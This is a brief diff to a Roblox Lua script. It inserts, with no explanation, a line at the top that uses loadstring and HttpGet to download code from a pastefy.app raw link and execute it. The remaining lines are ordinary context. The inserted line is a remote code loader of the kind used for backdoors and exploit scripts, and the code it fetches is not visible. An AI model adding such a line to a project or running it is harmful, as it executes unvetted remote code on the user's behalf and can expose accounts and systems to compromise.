@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/ZhKVgCK3/raw"))()
 wait(10)
 local Players = game:GetService("Players")
 
